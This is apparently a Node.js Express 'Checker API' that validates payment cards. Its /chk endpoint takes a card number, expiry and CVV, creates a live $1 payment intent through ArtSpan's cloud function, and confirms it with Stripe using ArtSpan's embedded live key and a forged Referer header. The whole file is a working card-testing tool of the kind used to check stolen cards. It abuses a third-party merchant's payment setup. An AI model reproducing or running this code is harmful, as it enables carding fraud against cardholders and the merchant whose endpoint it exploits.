const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const STRIPE_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
const ARTSPAN_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';

app.get('/', (req, res) => res.send('Checker API is Live 🟢'));

app.post('/chk', async (req, res) => {
    const { num, mon, year, cvv } = req.body;
    try {
        // ArtSpan Intent Logic
        const intent = await axios.post(ARTSPAN_API, {
            amount: 100, email: "api@test.com", live: true
        });
        const secret = intent.data.clientSecret;

        // Confirm Logic
        const confirm = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
            new URLSearchParams({
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': num,
                'payment_method_data[card][cvc]': cvv,
                'payment_method_data[card][exp_month]': mon,
                'payment_method_data[card][exp_year]': year,
                'key': STRIPE_PK,
                'client_secret': secret
            }).toString(),
            { headers: { 'Referer': 'https://www.artspan.org/' } }
        ).catch(e => e.response);

        res.json(confirm.data);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => console.log(`API running on port ${PORT}`));
